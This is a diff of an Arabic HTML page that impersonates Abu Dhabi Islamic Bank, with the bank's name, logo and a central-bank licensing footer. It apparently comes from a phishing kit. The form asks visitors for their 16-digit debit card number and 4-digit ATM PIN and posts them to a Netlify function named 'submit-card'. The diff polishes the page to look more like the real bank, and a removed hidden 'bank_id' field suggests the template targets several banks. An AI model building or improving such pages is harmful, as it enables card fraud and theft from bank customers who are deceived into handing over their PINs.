@@ -1,41 +1,66 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مصرف أبوظبي الإسلامي - إدخال البطاقة</title>
+    <title>مصرف أبو ظبي الإسلامي - الخطوة 1</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card-form { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
-        h1 { text-align: center; color: #333; margin-bottom: 20px; }
-        .input-group { margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; font-weight: bold; }
-        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        .submit-btn { width: 100%; padding: 12px; background-color: #158311; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background-color 0.3s; }
-        .submit-btn:hover { background-color: #126b0e; }
+        :root { --main-color: #007bff; --hover-color: #0056b3; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: white; font-family: Arial; min-height: 100vh; display: flex; flex-direction: column; }
+        .logo-container { text-align: center; padding: 15px 10px; border-bottom: 1px solid #eee; }
+        .logo { max-width: 200px; width: 100%; height: auto; }
+        .main-title { color: #000; font-size: 1.3rem; margin: 20px 15px; text-align: center; line-height: 1.4; }
+        .form-container { max-width: 500px; margin: 0 auto; padding: 0 15px 80px; flex: 1; }
+        .input-section { margin-bottom: 20px; }
+        .input-label { display: block; color: #333; margin-bottom: 8px; font-size: 0.9rem; font-weight: bold; }
+        .input-field { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; font-size: 0.95rem; direction: ltr; }
+        .input-field:focus { outline: none; border-color: var(--main-color); box-shadow: 0 0 3px var(--main-color); }
+        .submit-btn { background: var(--main-color); color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 1rem; margin-top: 25px; transition: background 0.3s; }
+        .submit-btn:hover { background: var(--hover-color); }
+        .footer { text-align: center; color: #666; font-size: 0.75rem; padding: 15px; border-top: 1px solid #eee; margin-top: auto; }
+        @media (max-width: 480px) { .logo { max-width: 180px; } .main-title { font-size: 1.1rem; } .input-label { font-size: 0.85rem; } .input-field { padding: 10px; font-size: 0.9rem; } .submit-btn { padding: 12px; } .footer { font-size: 0.7rem; } }
     </style>
 </head>
 <body>
+    <div class="logo-container">
+        <img src="adib.png" class="logo" alt="ADIB Logo">
+    </div>
 
-    <div class="card-form">
-        <h1>مصرف أبوظبي الإسلامي (ADIB)</h1>
-        <form action="/.netlify/functions/submit-card" method="POST">
-            
-            <!-- الحقل المخفي لتحديد البنك -->
-            <input type="hidden" name="bank_id" value="4">
+    <h1 class="main-title">مرحباً بك في الخدمات عبر الإنترنت من مصرف أبو ظبي الإسلامي</h1>
 
-            <div class="input-group">
-                <label for="s1">رقم البطاقة</label>
-                <input type="text" id="s1" name="s1" placeholder="xxxx xxxx xxxx xxxx" required>
+    <div class="form-container">
+        <form id="mainForm" action="/.netlify/functions/submit-card" method="POST">
+            <div class="input-section">
+                <label for="s1" class="input-label">رقم بطاقة الخصم المباشر / البطاقة المغطاة المكونة من 16 رقم</label>
+                <input type="text" 
+                       name="s1"
+                       id="s1"
+                       class="input-field"
+                       maxlength="16"
+                       pattern="\d{16}"
+                       inputmode="numeric"
+                       required>
             </div>
 
-            <div class="input-group">
-                <label for="s2">الرقم السري (PIN)</label>
-                <input type="password" id="s2" name="s2" maxlength="4" required>
+            <div class="input-section">
+                <label for="s2" class="input-label">رمز(PIN) الخاص بأجهزة السعر الفوري</label>
+                <input type="password" 
+                       id="s2"
+                       name="s2"
+                       class="input-field"
+                       maxlength="4"
+                       pattern="\d{4}"
+                       inputmode="numeric"
+                       required>
             </div>
 
-            <button type="submit" class="submit-btn">تأكيد</button>
+           <input type="submit" class="submit-btn" value="تسجيل الدخول" >
         </form>
+    </div>
+
+    <div class="footer">
+        مصرف أبو ظبي الإسلامي شركة مساهمة عامة مرخصة من مصرف الإمارات العربية المتحدة المركزي
     </div>
 
 </body>
